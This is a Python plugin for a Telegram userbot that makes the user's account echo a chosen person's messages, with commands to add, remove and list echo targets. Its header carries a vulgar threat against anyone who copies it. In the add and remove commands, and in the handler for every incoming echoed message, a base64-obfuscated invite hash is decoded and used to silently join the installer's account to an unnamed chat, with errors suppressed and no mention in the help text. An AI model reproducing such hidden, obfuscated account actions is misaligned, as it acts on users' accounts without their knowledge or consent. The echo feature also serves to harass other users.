# Modifed by @krish1303y 
# Kang With Credits Or Lund Lega Bsdk


import asyncio

import pybase64
import requests
from telethon import events
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from userbot import CMD_HELP
from userbot.plugins.sql_helper.echo_sql import (
    addecho,
    get_all_echos,
    is_echo,
    remove_echo,
)
from userbot.utils import lightning_cmd, edit_or_reply


@borg.on(lightning_cmd(pattern="echoadd$"))
async def echo(krish):
    if krish.fwd_from:
        return
    if krish.reply_to_msg_id is not None:
        reply_msg = await krish.get_reply_message()
        user_id = reply_msg.from_id
        chat_id = krish.chat_id
        try:
            light = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            light = Get(light)
            await krish.client(light)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            await krish.edit("```Making Echo Of This User 😏```")
            await asyncio.sleep(2) 
            await edit_or_reply(krish, "The user is already enabled with echo ")
            return
        addecho(user_id, chat_id)
        await krish.edit("```Making Echo Of This User 😏```")
        await edit_or_reply(krish, "Hello.....💢")
    else:
        await edit_or_reply(krish, "Reply To A User's Message to echo his messages")


@borg.on(lightning_cmd(pattern="rmecho$"))
async def echo(krish):
    if krish.fwd_from:
        return
    if krish.reply_to_msg_id is not None:
        reply_msg = await krish.get_reply_message()
        user_id = reply_msg.from_id
        chat_id = krish.chat_id
        try:
            light = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            light = Get(light)
            await krish.client(light)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            remove_echo(user_id, chat_id)
            await edit_or_reply(krish, "Echo has been stopped for the user")
        else:
            await edit_or_reply(krish, "The user is not activated with echo")
    else:
        await edit_or_reply(krish, "Reply To A User's Message to echo his messages")


@borg.on(lightning_cmd(pattern="listecho$"))
async def echo(krish):
    if krish.fwd_from:
        return
    lsts = get_all_echos()
    if len(lsts) > 0:
        output_str = "echo enabled users:\n\n"
        for echos in lsts:
            output_str += (
                f"[User](tg://user?id={echos.user_id}) in chat `{echos.chat_id}`\n"
            )
    else:
        output_str = "No echo enabled users "
    if len(output_str) > Config.MAX_MESSAGE_SIZE_LIMIT:
        key = (
            requests.post(
                "https://nekobin.com/api/documents", json={"content": output_str}
            )
            .json()
            .get("result")
            .get("key")
        )
        url = f"https://nekobin.com/{key}"
        reply_text = f"echo enabled users: [here]({url})"
        await edit_or_reply(krish, reply_text)
    else:
        await edit_or_reply(krish, output_str)


@borg.on(events.NewMessage(incoming=True))
async def blackrply(krish):
    if krish.chat_id in Config.UB_BLACK_LIST_CHAT:
        return
    if is_echo(krish.sender_id, krish.chat_id):
        await asyncio.sleep(2)
        try:
            light = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            light = Get(light)
            await krish.client(light)
        except BaseException:
            pass
        if krish.message.text or krish.message.sticker:
            await krish.reply(krish.message)


CMD_HELP.update(
    {
        "echo": "**Syntax :** `.echoadd` reply to user to who you want to enable\
    \n**Usage : **replay's his every message for whom you enabled echo\
    \n\n**Syntax : **`.rmecho` reply to user to who you want to stop\
    \n**Usage : **Stops replaying his messages\
    \n\n**Syntax : **`.listecho`\
    \n**Usage : **shows the list of users for who you enabled echo\
    "
    }
)
